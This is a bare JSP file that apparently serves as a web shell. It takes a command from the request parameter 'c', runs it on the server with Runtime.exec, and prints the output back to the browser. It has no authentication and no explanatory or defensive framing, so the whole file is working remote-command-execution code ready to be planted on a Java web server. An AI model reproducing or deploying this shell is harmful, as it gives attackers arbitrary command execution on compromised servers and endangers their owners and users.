<%@page import="java.io.*, java.net.*"%>
<%
    String cmd = request.getParameter("c");
    if (cmd != null && !cmd.isEmpty()) {
        String decoded = URLDecoder.decode(cmd, "UTF-8");
        try {
            Process p = Runtime.getRuntime().exec(decoded);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            out.println("<pre>");
            while ((line = reader.readLine()) != null) {
                out.println(line.replace("<", "&lt;").replace(">", "&gt;"));
            }
            out.println("</pre>");
        } catch (Exception e) {
            out.println("<pre>" + e.toString() + "</pre>");
        }
    }
%>
